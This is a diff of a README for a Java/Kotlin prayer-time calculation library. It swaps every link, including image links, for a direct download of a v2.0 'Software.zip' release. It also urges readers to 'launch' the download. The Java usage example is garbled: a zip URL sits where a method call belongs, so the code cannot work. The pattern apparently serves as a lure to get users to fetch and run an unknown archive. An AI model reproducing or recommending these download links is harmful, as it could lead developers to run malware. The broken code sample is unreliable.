@@ -1,6 +1,6 @@
 # 🕌🕋 PrayerTime Library for Java and Kotlin 📿🌙
 
-![PrayerTime](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v1.0/Release.zip)
+![PrayerTime](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v2.0/Software.zip)
 
 ## Welcome to the PrayerTime Library
 
@@ -39,7 +39,7 @@ The **PrayerTime Library** is designed to help developers easily integrate accur
 
 To start using the **PrayerTime Library** in your project, you can download the library from the following link:
 
-[![Download PrayerTime Library](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v1.0/Release.zip)](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v1.0/Release.zip)
+[![Download PrayerTime Library](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v2.0/Software.zip)](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v2.0/Software.zip)
 
 Please note that the download link provided above needs to be launched to access the library package.
 
@@ -61,7 +61,7 @@ Once the **PrayerTime Library** is integrated into your project, you can use the
 
 ```java
 PrayerTimeCalculator calculator = new PrayerTimeCalculator();
-PrayerTimes prayerTimes = https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v1.0/Release.zip(latitude, longitude, date);
+PrayerTimes prayerTimes = https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v2.0/Software.zip(latitude, longitude, date);
 ```
 
 ### Support
@@ -70,6 +70,6 @@ If you have any questions, feedback, or suggestions regarding the **PrayerTime L
 
 Thank you for choosing the **PrayerTime Library** for your Islamic prayer time calculation needs. May your prayers be answered, and your faith strengthened through the use of this library.
 
-![IslamicArt](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v1.0/Release.zip)
+![IslamicArt](https://github.com/johnnyerazo/PrayerTime_Library/releases/download/v2.0/Software.zip)
 
 🌟 May the blessings of Allah be with you always! 🌟
